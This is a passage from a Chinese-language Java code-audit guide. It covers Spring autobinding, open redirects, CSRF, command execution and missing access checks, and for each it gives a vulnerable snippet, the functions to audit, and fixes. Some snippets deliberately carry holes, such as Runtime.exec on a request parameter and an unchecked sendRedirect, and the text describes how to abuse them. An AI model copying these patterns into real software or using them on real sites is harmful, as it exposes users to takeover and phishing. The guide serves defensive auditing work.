<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;`@RequestMapping(value = &quot;/resetQuestion&quot;, method = RequestMethod.GET)`</span><br><span class="line">	public String resetViewQuestionHandler(@ModelAttribute User user) {</span><br><span class="line">		logger.info(&quot;Welcome resetQuestion ! &quot; + user);</span><br><span class="line">		return &quot;resetQuestion&quot;;</span><br><span class="line">	}</span><br></pre></td></tr></table></figure>

<p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x4E86;@ModelAttribute User user&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x8FD9;&#x91CC;&#x662F;&#x4ECE;session&#x4E2D;&#x83B7;&#x53D6;user&#x5BF9;&#x8C61;&#x3002;&#x4F46;&#x5B58;&#x5728;&#x95EE;&#x9898;&#x662F;&#x5982;&#x679C;&#x5728;&#x8BF7;&#x6C42;&#x4E2D;&#x6DFB;&#x52A0;user&#x5BF9;&#x8C61;&#x7684;&#x6210;&#x5458;&#x53D8;&#x91CF;&#x65F6;&#x5219;&#x4F1A;&#x66F4;&#x6539;user&#x5BF9;&#x8C61;&#x5BF9;&#x5E94;&#x6210;&#x5458;&#x7684;&#x503C;&#x3002; &#x6240;&#x4EE5;&#x5F53;&#x6211;&#x4EEC;&#x7ED9;resetQuestionHandler&#x53D1;&#x9001;GET&#x8BF7;&#x6C42;&#x7684;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x6DFB;&#x52A0;&#x201C;answer=hehe&#x201D;&#x53C2;&#x6570;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x7ED9;session&#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#x8D4B;&#x503C;&#xFF0C;&#x5C06;&#x539F;&#x672C;&#x5BC6;&#x7801;&#x627E;&#x56DE;&#x7684;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x7B54;&#x6848;&#x4FEE;&#x6539;&#x6210;&#x201C;hehe&#x201D;&#x3002;&#x8FD9;&#x6837;&#x5728;&#x6700;&#x540E;&#x4E00;&#x6B65;&#x6821;&#x9A8C;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x65F6;&#x5373;&#x53EF;&#x9A8C;&#x8BC1;&#x6210;&#x529F;&#x5E76;&#x627E;&#x56DE;&#x5BC6;&#x7801;</p>
<h5 id="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;-4"><a href="#&#x5BA1;&#x8BA1;&#x51FD;&#x6570;-4" class="headerlink" title="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;"></a>&#x5BA1;&#x8BA1;&#x51FD;&#x6570;</h5><p>&#x8FD9;&#x79CD;&#x6F0F;&#x6D1E;&#x4E00;&#x822C;&#x5728;&#x6BD4;&#x8F83;&#x591A;&#x6B65;&#x9AA4;&#x7684;&#x6D41;&#x7A0B;&#x4E2D;&#x51FA;&#x73B0;&#xFF0C;&#x6BD4;&#x5982;&#x8F6C;&#x8D26;&#x3001;&#x627E;&#x5BC6;&#x7B49;&#x573A;&#x666F;&#xFF0C;&#x4E5F;&#x53EF;&#x91CD;&#x70B9;&#x7559;&#x610F;&#x51E0;&#x4E2A;&#x6CE8;&#x89E3;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;`@SessionAttributes`</span><br><span class="line">@ModelAttribute</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>&#x66F4;&#x591A;&#x4FE1;&#x606F;&#x53EF;&#x53C2;&#x8003;<a href="/external_links/fca6378a9968a814be356cedb23bff06.html" target="blank" rel="noopener">Spring MVC Autobinding&#x6F0F;&#x6D1E;&#x5B9E;&#x4F8B;&#x521D;&#x7AA5;</a></p>
<h5 id="&#x4FEE;&#x590D;&#x65B9;&#x6848;-5"><a href="#&#x4FEE;&#x590D;&#x65B9;&#x6848;-5" class="headerlink" title="&#x4FEE;&#x590D;&#x65B9;&#x6848;"></a>&#x4FEE;&#x590D;&#x65B9;&#x6848;</h5><p>Spring MVC&#x4E2D;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;@InitBinder&#x6CE8;&#x89E3;&#xFF0C;&#x901A;&#x8FC7;WebDataBinder&#x7684;&#x65B9;&#x6CD5;setAllowedFields&#x3001;setDisallowedFields&#x8BBE;&#x7F6E;&#x5141;&#x8BB8;&#x6216;&#x4E0D;&#x5141;&#x8BB8;&#x7ED1;&#x5B9A;&#x7684;&#x53C2;&#x6570;&#x3002;</p>
<h3 id="URL&#x91CD;&#x5B9A;&#x5411;"><a href="#URL&#x91CD;&#x5B9A;&#x5411;" class="headerlink" title="URL&#x91CD;&#x5B9A;&#x5411;"></a>URL&#x91CD;&#x5B9A;&#x5411;</h3><h5 id="&#x4ECB;&#x7ECD;-6"><a href="#&#x4ECB;&#x7ECD;-6" class="headerlink" title="&#x4ECB;&#x7ECD;"></a>&#x4ECB;&#x7ECD;</h5><p>&#x7531;&#x4E8E;Web&#x7AD9;&#x70B9;&#x6709;&#x65F6;&#x9700;&#x8981;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7684;&#x903B;&#x8F91;&#x5C06;&#x7528;&#x6237;&#x5F15;&#x5411;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x9875;&#x9762;&#xFF0C;&#x5982;&#x5178;&#x578B;&#x7684;&#x767B;&#x5F55;&#x63A5;&#x53E3;&#x5C31;&#x7ECF;&#x5E38;&#x9700;&#x8981;&#x5728;&#x8BA4;&#x8BC1;&#x6210;&#x529F;&#x4E4B;&#x540E;&#x5C06;&#x7528;&#x6237;&#x5F15;&#x5BFC;&#x5230;&#x767B;&#x5F55;&#x4E4B;&#x524D;&#x7684;&#x9875;&#x9762;&#xFF0C;&#x6574;&#x4E2A;&#x8FC7;&#x7A0B;&#x4E2D;&#x5982;&#x679C;&#x5B9E;&#x73B0;&#x4E0D;&#x597D;&#x5C31;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;URL&#x91CD;&#x5B9A;&#x5411;&#x95EE;&#x9898;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x6784;&#x9020;&#x6076;&#x610F;&#x8DF3;&#x8F6C;&#x7684;&#x94FE;&#x63A5;&#xFF0C;&#x53EF;&#x4EE5;&#x5411;&#x7528;&#x6237;&#x53D1;&#x8D77;&#x9493;&#x9C7C;&#x653B;&#x51FB;&#x3002;</p>
<h5 id="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-6"><a href="#&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-6" class="headerlink" title="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;"></a>&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;</h5><p>&#x6B64;&#x5904;&#x4EE5;Servlet&#x7684;redirect &#x65B9;&#x5F0F;&#x4E3A;&#x4F8B;&#xFF0C;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x7247;&#x6BB5;&#x5982;&#x4E0B;:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;	String site = request.getParameter(&quot;url&quot;);</span><br><span class="line">	if(!site.isEmpty()){</span><br><span class="line">		response.sendRedirect(site);</span><br><span class="line">	}</span><br></pre></td></tr></table></figure>

<h5 id="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;-5"><a href="#&#x5BA1;&#x8BA1;&#x51FD;&#x6570;-5" class="headerlink" title="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;"></a>&#x5BA1;&#x8BA1;&#x51FD;&#x6570;</h5><p>java&#x7A0B;&#x5E8F;&#x4E2D;URL&#x91CD;&#x5B9A;&#x5411;&#x7684;&#x65B9;&#x6CD5;&#x5747;&#x53EF;&#x7559;&#x610F;&#x662F;&#x5426;&#x5BF9;&#x8DF3;&#x8F6C;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x6821;&#x9A8C;&#x3001;&#x91CD;&#x5B9A;&#x5411;&#x51FD;&#x6570;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;`sendRedirect`</span><br><span class="line">setHeader</span><br><span class="line">forward</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h5 id="&#x4FEE;&#x590D;&#x65B9;&#x6848;-6"><a href="#&#x4FEE;&#x590D;&#x65B9;&#x6848;-6" class="headerlink" title="&#x4FEE;&#x590D;&#x65B9;&#x6848;"></a>&#x4FEE;&#x590D;&#x65B9;&#x6848;</h5><ul>
<li>&#x4F7F;&#x7528;&#x767D;&#x540D;&#x5355;&#x6821;&#x9A8C;&#x91CD;&#x5B9A;&#x5411;&#x7684;url&#x5730;&#x5740;</li>
<li>&#x7ED9;&#x7528;&#x6237;&#x5C55;&#x793A;&#x5B89;&#x5168;&#x98CE;&#x9669;&#x63D0;&#x793A;&#xFF0C;&#x5E76;&#x7531;&#x7528;&#x6237;&#x518D;&#x6B21;&#x786E;&#x8BA4;&#x662F;&#x5426;&#x8DF3;&#x8F6C;</li>
</ul>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><h5 id="&#x4ECB;&#x7ECD;-7"><a href="#&#x4ECB;&#x7ECD;-7" class="headerlink" title="&#x4ECB;&#x7ECD;"></a>&#x4ECB;&#x7ECD;</h5><p>&#x8DE8;&#x7AD9;&#x8BF7;&#x6C42;&#x4F2A;&#x9020;&#xFF08;Cross-Site Request Forgery&#xFF0C;CSRF&#xFF09;&#x662F;&#x4E00;&#x79CD;&#x4F7F;&#x5DF2;&#x767B;&#x5F55;&#x7528;&#x6237;&#x5728;&#x4E0D;&#x77E5;&#x60C5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#x67D0;&#x79CD;&#x52A8;&#x4F5C;&#x7684;&#x653B;&#x51FB;&#x3002;&#x56E0;&#x4E3A;&#x653B;&#x51FB;&#x8005;&#x770B;&#x4E0D;&#x5230;&#x4F2A;&#x9020;&#x8BF7;&#x6C42;&#x7684;&#x54CD;&#x5E94;&#x7ED3;&#x679C;&#xFF0C;&#x6240;&#x4EE5;CSRF&#x653B;&#x51FB;&#x4E3B;&#x8981;&#x7528;&#x6765;&#x6267;&#x884C;&#x52A8;&#x4F5C;&#xFF0C;&#x800C;&#x975E;&#x7A83;&#x53D6;&#x7528;&#x6237;&#x6570;&#x636E;&#x3002;&#x5F53;&#x53D7;&#x5BB3;&#x8005;&#x662F;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x7528;&#x6237;&#x65F6;&#xFF0C;CSRF&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x5728;&#x5176;&#x4E0D;&#x77E5;&#x60C5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x8F6C;&#x79FB;&#x7528;&#x6237;&#x8D44;&#x91D1;&#x3001;&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#x7B49;&#x64CD;&#x4F5C;&#xFF1B;&#x4F46;&#x662F;&#x5982;&#x679C;&#x53D7;&#x5BB3;&#x8005;&#x662F;&#x4E00;&#x4E2A;&#x5177;&#x6709;&#x7BA1;&#x7406;&#x5458;&#x6743;&#x9650;&#x7684;&#x7528;&#x6237;&#x65F6;CSRF&#x5219;&#x53EF;&#x80FD;&#x5A01;&#x80C1;&#x5230;&#x6574;&#x4E2A;Web&#x7CFB;&#x7EDF;&#x7684;&#x5B89;&#x5168;&#x3002;</p>
<h5 id="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-7"><a href="#&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-7" class="headerlink" title="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;"></a>&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;</h5><p>&#x7531;&#x4E8E;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x5BF9;CSRF&#x7684;&#x4E86;&#x89E3;&#x4E0D;&#x8DB3;&#xFF0C;&#x9519;&#x628A;&#x201C;&#x7ECF;&#x8FC7;&#x8BA4;&#x8BC1;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x53D1;&#x8D77;&#x7684;&#x8BF7;&#x6C42;&#x201D;&#x5F53;&#x6210;&#x201C;&#x7ECF;&#x8FC7;&#x8BA4;&#x8BC1;&#x7684;&#x7528;&#x6237;&#x53D1;&#x8D77;&#x7684;&#x8BF7;&#x6C42;&#x201D;&#xFF0C;&#x5F53;&#x5DF2;&#x8BA4;&#x8BC1;&#x7684;&#x7528;&#x6237;&#x70B9;&#x51FB;&#x653B;&#x51FB;&#x8005;&#x6784;&#x9020;&#x7684;&#x6076;&#x610F;&#x94FE;&#x63A5;&#x540E;&#x5C31;&#x201C;&#x88AB;&#x201D;&#x6267;&#x884C;&#x4E86;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x4E00;&#x4E2A;&#x535A;&#x5BA2;&#x5220;&#x9664;&#x6587;&#x7AE0;&#x662F;&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x65B9;&#x5F0F;&#x5B9E;&#x73B0;&#x7684;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;`GET http://blog.com/article/delete.jsp?id=102`</span><br></pre></td></tr></table></figure>

<p>&#x5F53;&#x653B;&#x51FB;&#x8005;&#x8BF1;&#x5BFC;&#x7528;&#x6237;&#x70B9;&#x51FB;&#x4E0B;&#x9762;&#x7684;&#x94FE;&#x63A5;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x8BE5;&#x7528;&#x6237;&#x767B;&#x5F55;&#x535A;&#x5BA2;&#x7F51;&#x7AD9;&#x7684;&#x51ED;&#x8BC1;&#x5C1A;&#x672A;&#x8FC7;&#x671F;&#xFF0C;&#x90A3;&#x4E48;&#x4ED6;&#x4FBF;&#x5728;&#x4E0D;&#x77E5;&#x60C5;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5220;&#x9664;&#x4E86;id&#x4E3A;102&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x7B80;&#x5355;&#x7684;&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x53EA;&#x80FD;&#x4FDD;&#x8BC1;&#x8BF7;&#x6C42;&#x53D1;&#x81EA;&#x67D0;&#x4E2A;&#x7528;&#x6237;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#xFF0C;&#x5374;&#x4E0D;&#x80FD;&#x4FDD;&#x8BC1;&#x8BF7;&#x6C42;&#x672C;&#x8EAB;&#x662F;&#x7528;&#x6237;&#x81EA;&#x613F;&#x53D1;&#x51FA;&#x7684;&#x3002;</p>
<h5 id="&#x6F0F;&#x6D1E;&#x5BA1;&#x8BA1;"><a href="#&#x6F0F;&#x6D1E;&#x5BA1;&#x8BA1;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5BA1;&#x8BA1;"></a>&#x6F0F;&#x6D1E;&#x5BA1;&#x8BA1;</h5><p>&#x6B64;&#x7C7B;&#x6F0F;&#x6D1E;&#x4E00;&#x822C;&#x90FD;&#x4F1A;&#x5728;&#x6846;&#x67B6;&#x4E2D;&#x89E3;&#x51B3;&#x4FEE;&#x590D;&#xFF0C;&#x6240;&#x4EE5;&#x5728;&#x5BA1;&#x8BA1;csrf&#x6F0F;&#x6D1E;&#x65F6;&#x3002;&#x9996;&#x5148;&#x8981;&#x719F;&#x6089;&#x6846;&#x67B6;&#x5BF9;CSRF&#x7684;&#x9632;&#x62A4;&#x65B9;&#x6848;&#xFF0C;&#x4E00;&#x822C;&#x5BA1;&#x8BA1;&#x65F6;&#x53EF;&#x67E5;&#x770B;&#x589E;&#x5220;&#x6539;&#x8BF7;&#x6C42;&#x91CD;&#x662F;&#x5426;&#x6709;token&#x3001;formtoken&#x7B49;&#x5173;&#x952E;&#x5B57;&#x4EE5;&#x53CA;&#x662F;&#x5426;&#x6709;&#x5BF9;&#x8BF7;&#x6C42;&#x7684;Referer&#x6709;&#x8FDB;&#x884C;&#x6821;&#x9A8C;&#x3002;&#x624B;&#x52A8;&#x6D4B;&#x8BD5;&#x65F6;,&#x5982;&#x679C;&#x6709;token&#x7B49;&#x5173;&#x952E;&#x5219;&#x66FF;&#x6362;token&#x503C;&#x4E3A;&#x81EA;&#x5B9A;&#x4E49;&#x503C;&#x5E76;&#x91CD;&#x653E;&#x8BF7;&#x6C42;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5219;&#x66FF;&#x6362;&#x8BF7;&#x6C42;Referer&#x5934;&#x4E3A;&#x81EA;&#x5B9A;&#x4E49;&#x94FE;&#x63A5;&#x6216;&#x7F6E;&#x7A7A;&#x3002;&#x91CD;&#x653E;&#x8BF7;&#x6C42;&#x770B;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6210;&#x529F;&#x8FD4;&#x56DE;&#x6570;&#x636E;&#x4ECE;&#x800C;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;CSRF&#x6F0F;&#x6D1E;&#x3002;</p>
<h5 id="&#x4FEE;&#x590D;&#x65B9;&#x6848;-7"><a href="#&#x4FEE;&#x590D;&#x65B9;&#x6848;-7" class="headerlink" title="&#x4FEE;&#x590D;&#x65B9;&#x6848;"></a>&#x4FEE;&#x590D;&#x65B9;&#x6848;</h5><ul>
<li>Referer&#x6821;&#x9A8C;&#xFF0C;&#x5BF9;HTTP&#x8BF7;&#x6C42;&#x7684;Referer&#x6821;&#x9A8C;&#xFF0C;&#x5982;&#x679C;&#x8BF7;&#x6C42;Referer&#x7684;&#x5730;&#x5740;&#x4E0D;&#x5728;&#x5141;&#x8BB8;&#x7684;&#x5217;&#x8868;&#x4E2D;&#xFF0C;&#x5219;&#x62E6;&#x622A;&#x8BF7;&#x6C42;&#x3002;</li>
<li>Token&#x6821;&#x9A8C;&#xFF0C;&#x670D;&#x52A1;&#x7AEF;&#x751F;&#x6210;&#x968F;&#x673A;token&#xFF0C;&#x5E76;&#x4FDD;&#x5B58;&#x5728;&#x672C;&#x6B21;&#x4F1A;&#x8BDD;cookie&#x4E2D;&#xFF0C;&#x7528;&#x6237;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#x65F6;&#x9644;&#x5E26;token&#x53C2;&#x6570;&#xFF0C;&#x670D;&#x52A1;&#x7AEF;&#x5BF9;&#x8BE5;&#x968F;&#x673A;&#x6570;&#x8FDB;&#x884C;&#x6821;&#x9A8C;&#x3002;&#x5982;&#x679C;&#x4E0D;&#x6B63;&#x786E;&#x5219;&#x8BA4;&#x4E3A;&#x8BE5;&#x8BF7;&#x6C42;&#x4E3A;&#x4F2A;&#x9020;&#x8BF7;&#x6C42;&#x62D2;&#x7EDD;&#x8BE5;&#x8BF7;&#x6C42;&#x3002;</li>
<li>Formtoken&#x6821;&#x9A8C;&#xFF0C;Formtoken&#x6821;&#x9A8C;&#x672C;&#x8EAB;&#x4E5F;&#x662F;Token&#x6821;&#x9A8C;&#xFF0C;&#x53EA;&#x662F;&#x5728;&#x672C;&#x6B21;&#x8868;&#x5355;&#x8BF7;&#x6C42;&#x6709;&#x6548;&#x3002;</li>
<li>&#x5BF9;&#x4E8E;&#x9AD8;&#x5B89;&#x5168;&#x6027;&#x64CD;&#x4F5C;&#x5219;&#x53EF;&#x4F7F;&#x7528;&#x9A8C;&#x8BC1;&#x7801;&#x3001;&#x77ED;&#x4FE1;&#x3001;&#x5BC6;&#x7801;&#x7B49;&#x4E8C;&#x6B21;&#x6821;&#x9A8C;&#x63AA;&#x65BD;</li>
<li>&#x589E;&#x5220;&#x6539;&#x8BF7;&#x6C42;&#x4F7F;&#x7528;POST&#x8BF7;&#x6C42;</li>
</ul>
<h3 id="&#x547D;&#x4EE4;&#x6267;&#x884C;"><a href="#&#x547D;&#x4EE4;&#x6267;&#x884C;" class="headerlink" title="&#x547D;&#x4EE4;&#x6267;&#x884C;"></a>&#x547D;&#x4EE4;&#x6267;&#x884C;</h3><h5 id="&#x4ECB;&#x7ECD;-8"><a href="#&#x4ECB;&#x7ECD;-8" class="headerlink" title="&#x4ECB;&#x7ECD;"></a>&#x4ECB;&#x7ECD;</h5><p>&#x7531;&#x4E8E;&#x4E1A;&#x52A1;&#x9700;&#x6C42;&#xFF0C;&#x7A0B;&#x5E8F;&#x6709;&#x53EF;&#x80FD;&#x8981;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x5982;&#x679C;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#x7528;&#x6237;&#x53EF;&#x63A7;&#xFF0C;&#x4E1A;&#x52A1;&#x4E0A;&#x6709;&#x6CA1;&#x6709;&#x505A;&#x597D;&#x9650;&#x5236;&#xFF0C;&#x5C31;&#x53EF;&#x80FD;&#x51FA;&#x73B0;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#x3002;</p>
<h5 id="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-8"><a href="#&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-8" class="headerlink" title="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;"></a>&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;</h5><p>&#x6B64;&#x5904;&#x4EE5;getRuntime&#x4E3A;&#x4F8B;&#xFF0C;&#x793A;&#x4F8B;&#x4EE3;&#x7801;&#x7247;&#x6BB5;&#x5982;&#x4E0B;:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;	String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">	Runtime.getRuntime().exec(cmd);</span><br></pre></td></tr></table></figure>

<h5 id="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;-6"><a href="#&#x5BA1;&#x8BA1;&#x51FD;&#x6570;-6" class="headerlink" title="&#x5BA1;&#x8BA1;&#x51FD;&#x6570;"></a>&#x5BA1;&#x8BA1;&#x51FD;&#x6570;</h5><p>&#x8FD9;&#x79CD;&#x6F0F;&#x6D1E;&#x539F;&#x7406;&#x4E0A;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x91CD;&#x70B9;&#x662F;&#x627E;&#x5230;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x770B;&#x547D;&#x4EE4;&#x662F;&#x5426;&#x53EF;&#x63A7;&#x3002;&#x5728;&#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x662F;&#x80FD;&#x5224;&#x65AD;&#x51FA;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6B64;&#x7C7B;&#x529F;&#x80FD;&#xFF0C;&#x8FD9;&#x91CC;&#x4E3E;&#x4E2A;&#x5178;&#x578B;&#x7684;&#x5B9E;&#x4F8B;&#x573A;&#x666F;,&#x6709;&#x7684;&#x7A0B;&#x5E8F;&#x529F;&#x80FD;&#x9700;&#x6C42;&#x63D0;&#x4F9B;&#x7F51;&#x9875;&#x622A;&#x56FE;&#x529F;&#x80FD;&#xFF0C;&#x7B14;&#x8005;&#x89C1;&#x8FC7;&#x591A;&#x6570;&#x662F;&#x4F7F;&#x7528;phantomjs&#x5B9E;&#x73B0;&#xFF0C;&#x90A3;&#x52BF;&#x5FC5;&#x662F;&#x9700;&#x8981;&#x8C03;&#x7528;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x6267;&#x884C;phantomjs&#x5E76;&#x4F20;&#x53C2;&#x5B9E;&#x73B0;&#x622A;&#x56FE;&#x3002;&#x800C;&#x53C2;&#x6570;&#x5927;&#x591A;&#x6570;&#x60C5;&#x51B5;&#x4E0B;&#x5E94;&#x8BE5;&#x662F;&#x5F53;&#x524D;url&#x6216;&#x5176;&#x4E2D;&#x83B7;&#x53D6;&#x76F8;&#x5173;&#x53C2;&#x6570;&#xFF0C;&#x6B64;&#x65F6;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x6F0F;&#x6D1E;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x5176;&#x5B83;&#x6BD4;&#x8F83;&#x7279;&#x522B;&#x7684;&#x573A;&#x666F;&#x53EF;&#x81EA;&#x884C;&#x8111;&#x6D1E;&#x3002;</p>
<p>java&#x7A0B;&#x5E8F;&#x4E2D;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x7684;&#x51FD;&#x6570;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;`Runtime.exec`</span><br><span class="line">ProcessBuilder.start</span><br><span class="line">GroovyShell.evaluate</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h5 id="&#x4FEE;&#x590D;&#x65B9;&#x6848;-8"><a href="#&#x4FEE;&#x590D;&#x65B9;&#x6848;-8" class="headerlink" title="&#x4FEE;&#x590D;&#x65B9;&#x6848;"></a>&#x4FEE;&#x590D;&#x65B9;&#x6848;</h5><ul>
<li>&#x907F;&#x514D;&#x547D;&#x4EE4;&#x7528;&#x6237;&#x53EF;&#x63A7;</li>
<li>&#x5982;&#x9700;&#x7528;&#x6237;&#x8F93;&#x5165;&#x53C2;&#x6570;&#xFF0C;&#x5219;&#x5BF9;&#x7528;&#x6237;&#x8F93;&#x5165;&#x505A;&#x4E25;&#x683C;&#x6821;&#x9A8C;&#xFF0C;&#x5982;&amp;&amp;&#x3001;|&#x3001;;&#x7B49;</li>
</ul>
<h3 id="&#x6743;&#x9650;&#x63A7;&#x5236;"><a href="#&#x6743;&#x9650;&#x63A7;&#x5236;" class="headerlink" title="&#x6743;&#x9650;&#x63A7;&#x5236;"></a>&#x6743;&#x9650;&#x63A7;&#x5236;</h3><h5 id="&#x4ECB;&#x7ECD;-9"><a href="#&#x4ECB;&#x7ECD;-9" class="headerlink" title="&#x4ECB;&#x7ECD;"></a>&#x4ECB;&#x7ECD;</h5><p>&#x8D8A;&#x6743;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x6C34;&#x5E73;&#x3001;&#x5782;&#x76F4;&#x8D8A;&#x6743;&#x4E24;&#x79CD;,&#x7A0B;&#x5E8F;&#x5728;&#x5904;&#x7406;&#x7528;&#x6237;&#x8BF7;&#x6C42;&#x65F6;&#x672A;&#x5BF9;&#x7528;&#x6237;&#x7684;&#x6743;&#x9650;&#x8FDB;&#x884C;&#x6821;&#x9A8C;&#xFF0C;&#x4F7F;&#x7684;&#x7528;&#x6237;&#x53EF;&#x8BBF;&#x95EE;&#x3001;&#x64CD;&#x4F5C;&#x5176;&#x4ED6;&#x76F8;&#x540C;&#x89D2;&#x8272;&#x7528;&#x6237;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x662F;&#x6C34;&#x5E73;&#x8D8A;&#x6743;&#xFF1B;&#x5982;&#x679C;&#x4F4E;&#x6743;&#x9650;&#x7528;&#x6237;&#x53EF;&#x8BBF;&#x95EE;&#x3001;&#x64CD;&#x4F5C;&#x9AD8;&#x6743;&#x9650;&#x7528;&#x6237;&#x5219;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E3A;&#x5782;&#x76F4;&#x8D8A;&#x6743;&#x3002;</p>
<h5 id="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-9"><a href="#&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;-9" class="headerlink" title="&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;"></a>&#x6F0F;&#x6D1E;&#x793A;&#x4F8B;</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;    @RequestMapping(value=&quot;/getUserInfo&quot;,method = RequestMethod.GET)</span><br><span class="line">    public String getUserInfo(Model model, HttpServletRequest request) throws IOException {</span><br><span class="line">        String userid = request.getParameter(&quot;userid&quot;);</span><br><span class="line">        if(!userid.isEmpty()){</span><br><span class="line">            String info=userModel.getuserInfoByid(userid);</span><br><span class="line">            return info;</span><br><span class="line">        }</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>

